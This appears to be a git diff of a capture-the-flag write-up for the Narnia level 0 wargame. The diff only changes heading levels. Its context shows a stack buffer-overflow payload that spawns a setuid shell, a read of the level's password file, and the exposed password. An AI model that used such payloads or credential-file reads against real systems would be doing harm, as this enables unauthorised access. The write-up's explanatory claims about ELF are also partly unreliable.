@@ -49,7 +49,7 @@ narnia0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynami
 ```
 Our target binary is an ELF 32-bit binary.ELF is Executable Linkable Format which consists of a symbol look-ups and relocatable table, that is, it can be loaded at any memory address by the kernel.
 
-## Exploitation
+### Exploitation
 
 Let's send some crafted inpu to the program and observe 
 
@@ -63,7 +63,7 @@ narnia0@narnia:/narnia$
 ```
 Great we have overwritten the val variable with 0x43434343 which is our 4 "C". Now we know we can overite the val variable . We just need to replace "C" with 0xdeadbeef which is the correct value the program accept. Before that we need to convert 0xdeadbeef to little endian format which is "\xef\xbe\xad\xde".
 
-## Grabbing the flag:
+### Grabbing the flag:
 
 ```python
 narnia0@narnia:/narnia$ (python -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0
@@ -77,7 +77,7 @@ narnia1
 cat /etc/narnia_pass/narnia1
 efeidiedae
 ```
-## Conclusion 
+### Conclusion 
 Running the above command give us a shell as narnia1, now we can cat the flag. This is a very simple buffer overflow example.
 
 
